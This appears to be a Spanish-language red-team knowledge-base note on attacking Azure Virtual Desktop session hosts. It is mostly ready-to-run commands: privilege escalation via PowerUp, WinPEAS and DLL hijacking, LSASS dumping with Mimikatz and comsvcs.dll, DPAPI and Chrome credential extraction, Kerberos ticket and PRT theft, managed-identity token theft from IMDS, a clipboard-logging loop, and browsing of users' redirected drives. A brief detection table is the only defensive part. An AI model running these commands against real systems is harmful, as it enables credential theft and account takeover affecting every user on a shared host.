---
tags: [cloud, azure, avd, session-host, privesc, credential-harvesting]
status: wip
---

# AVD — Session Host Attacks

> Ataques sobre los session hosts una vez dentro de la sesión AVD: escalada de privilegios local, credential harvesting, token theft y abuso de managed identity.

---

## Contexto

El session host es una VM Windows en Azure. Según la configuración:
- **Single-session** (Win10/11): un usuario por VM — menor superficie lateral
- **Multi-session** (Win10/11 Enterprise Multi): múltiples usuarios simultáneos — mayor impacto

---

## Escalada de privilegios local

### Vectores clásicos Windows

```powershell
# Verificar privilegios actuales
whoami /priv
whoami /groups

# Buscar servicios vulnerables (unquoted paths, weak permissions)
# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# WinPEAS
.\winPEASx64.exe

# Puntos comunes en session hosts AVD:
# - Agentes de monitoreo con permisos excesivos (MMA, AMA)
# - AVD Agent corriendo como SYSTEM
# - Software corporativo sin hardening
# - Scheduled Tasks con permisos débiles
```

### Abuso de servicios AVD

```powershell
# El AVD Agent y RDAgent corren como SYSTEM
# Si el directorio del agente tiene permisos débiles → DLL hijacking

# Verificar permisos
icacls "C:\Program Files\Microsoft RDInfra\"

# Buscar DLLs que el agente intenta cargar y no encuentra (Procmon)
# Si se puede escribir en el directorio → colocar DLL maliciosa
```

---

## Credential Harvesting

### LSASS Dump

```powershell
# Mimikatz (si no hay EDR agresivo)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# En multi-session → credenciales de TODOS los usuarios conectados
# Buscar: NTLM hashes, Kerberos tickets, WDigest passwords (si habilitado)
```

```powershell
# Alternativa sin tocar disco — comsvcs.dll
# Obtener PID de lsass
tasklist /fi "imagename eq lsass.exe"

rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full

# Analizar offline con pypykatz
pypykatz lsa minidump lsass.dmp
```

### DPAPI — Credenciales almacenadas

```powershell
# Credenciales de Windows Credential Manager
mimikatz # dpapi::cred /in:C:\Users\<user>\AppData\Local\Microsoft\Credentials\<GUID>

# Master key
mimikatz # dpapi::masterkey /in:C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID> /rpc

# Cookies del navegador (Chrome)
mimikatz # dpapi::chrome /in:"%LocalAppData%\Google\Chrome\User Data\Default\Login Data"
```

### Kerberos Tickets

```powershell
# Listar tickets en memoria
klist

# Exportar con Mimikatz
mimikatz # sekurlsa::tickets /export

# Exportar con Rubeus
Rubeus.exe dump /nowrap

# En multi-session: tickets de todos los usuarios logueados
Rubeus.exe triage
# → Listar todos los tickets, buscar TGTs de usuarios privilegiados
```

---

## PRT Extraction desde Session Host

```powershell
# Si el session host está Entra ID Joined (común en AVD)
dsregcmd /status
# AzureAdJoined: YES → hay PRTs de los usuarios

# Extraer con Mimikatz (SYSTEM)
mimikatz # sekurlsa::cloudap

# Extraer con ROADtoken (menos detección)
ROADtoken.exe

# Con el PRT → acceso a Azure/M365 como el usuario
# Usar con roadtx o AADInternals para obtener access tokens
roadtx interactiveauth --prt <PRT> --prt-sessionkey <KEY>
```

---

## IMDS — Managed Identity Abuse

```bash
# Si el session host tiene Managed Identity asignada
# IMDS (Instance Metadata Service) en 169.254.169.254 — sin autenticación

# Obtener token de la Managed Identity
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | jq .

# Token para Microsoft Graph
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" \
  | jq .

# Desde PowerShell
$token = Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -Headers @{Metadata="true"}
$token.access_token
```

```bash
# Verificar permisos del Managed Identity
# Usar el token con az cli
az login --identity
az role assignment list --assignee <MI_OBJECT_ID> --all

# Comunes:
# - Contributor sobre el RG → control total de las VMs
# - Storage Blob Data Reader → leer blobs (¿backups? ¿secrets?)
# - Key Vault Secrets User → leer secretos del Key Vault
```

---

## Clipboard y Drive Hijacking

```powershell
# Si el host pool permite clipboard redirection:
# customRdpProperty NO contiene "redirectclipboard:i:0"

# Monitorizar clipboard
# PowerShell — polling del clipboard
while($true) {
    $clip = Get-Clipboard -Raw
    if ($clip) { $clip | Out-File -Append C:\temp\clipboard.log }
    Start-Sleep -Seconds 2
}

# Si drive redirection está habilitado:
# Los drives locales del usuario aparecen como \\tsclient\C, \\tsclient\D, etc.
# → Acceso a ficheros del equipo del usuario
dir \\tsclient\C\Users\
```

---

## Keylogging en sesión RDP

```powershell
# Dentro del session host — cualquier keylogger clásico captura input
# El input RDP se procesa como input local en la sesión

# Ejemplo con PowerShell (requiere privilegios)
# SetWindowsHookEx via P/Invoke — log de teclas por sesión

# Herramientas:
# - Cobalt Strike: keylogger per-session
# - SharpKeylogger
# - PowerShell Empire: módulo keylogger
```

---

## OPSEC / Detección

| Acción | Log/Alerta |
|--------|------------|
| LSASS dump | Sysmon Event 10 (Process Access lsass), Windows Defender alert |
| comsvcs.dll MiniDump | Command line logging — rundll32 + comsvcs + MiniDump |
| Mimikatz | EDR detection, Sysmon `sekurlsa` en command line |
| IMDS token request | NSG flow logs (tráfico a 169.254.169.254) |
| Clipboard monitoring | PowerShell script block logging Event 4104 |
| PRT extraction | Windows Event `CloudAP` debug logs |

---

## Ver también

- [[09-cloud/azure/azure-virtual-desktop|Azure Virtual Desktop]]
- [[09-cloud/azure/avd---breakout|AVD - Breakout]]
- [[09-cloud/azure/avd---lateral-movement|AVD - Lateral Movement]]
- [[09-cloud/azure/avd---persistencia|AVD - Persistencia]]

---

## Referencias

- [Mimikatz — cloudap module](https://github.com/gentilkiwi/mimikatz/wiki)
- [ROADtoken — dirkjanm](https://github.com/dirkjanm/ROADtoken)
- [IMDS Abuse — Microsoft Threat Intelligence](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service)
- [NetSPI — AVD Attack Surface](https://www.netspi.com/blog/)
